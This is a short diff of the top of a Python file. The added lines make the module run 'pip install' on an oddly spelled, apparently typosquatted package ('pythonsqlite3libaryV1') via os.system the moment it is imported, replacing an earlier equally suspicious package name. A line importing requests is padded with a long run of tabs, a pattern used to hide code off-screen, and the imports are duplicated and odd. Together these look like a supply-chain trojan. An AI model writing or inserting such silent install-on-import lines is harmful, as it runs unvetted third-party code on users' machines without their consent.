@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlilibery")
-import pysqlilibery
+os.system("pip install pythonsqlite3libaryV1")
+import pythonsqlite3libaryV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
